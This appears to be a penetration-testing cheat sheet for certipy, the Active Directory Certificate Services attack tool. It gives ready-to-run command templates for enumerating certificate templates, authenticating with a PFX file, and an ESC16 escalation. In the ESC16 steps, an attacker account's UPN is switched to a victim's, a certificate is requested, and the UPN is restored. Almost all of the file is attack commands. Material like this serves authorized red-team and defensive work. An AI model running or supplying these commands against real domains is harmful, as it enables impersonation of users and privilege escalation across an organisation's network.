# certipy

% certipy, adcs

## Enumerate AD CS Templates
#plateform/linux #target/remote #port/135 #protocol/rpc #cat/RECON

```bash
certipy find -u <Username> -p <Password> -dc-ip <IP> -json
```

## Certipy - PFX Authentication
#plateform/linux #target/remote #port/135 #protocol/rpc #cat/ATTACK/CONNECT

```bash
certipy auth -pfx <PFX_FILE> -username <VICTIM> -domain <Domain> -dc-ip <IP>
```

## ESC16 - ADCS
#plateform/linux #target/remote #port/135 #protocol/rpc #cat/ATTACK/PRIVILEGE-ESCALATION

```bash
Username='<Username>'
Password='<Password>'
Domain='<Domain>'
DC_HOST='<DC_HOST>'
VICTIM='<VICTIM>'
ATTACKER='<ATTACKER>'
IP='<IP>'
certipy account -u $Username@$Domain -hashes :$Password -dc-ip $IP -target $DC_HOST -upn $VICTIM -user $ATTACKER update
certipy req -timeout 20 -u $Username@$Domain -hashes :$Password -dc-ip $IP -target '<FQDN>' -ca '<CA_NAME>' -template 'User'
certipy account -u $Username@$Domain -hashes :$Password -dc-ip $IP -target $DC_HOST -upn $ATTACKER -user $ATTACKER update
```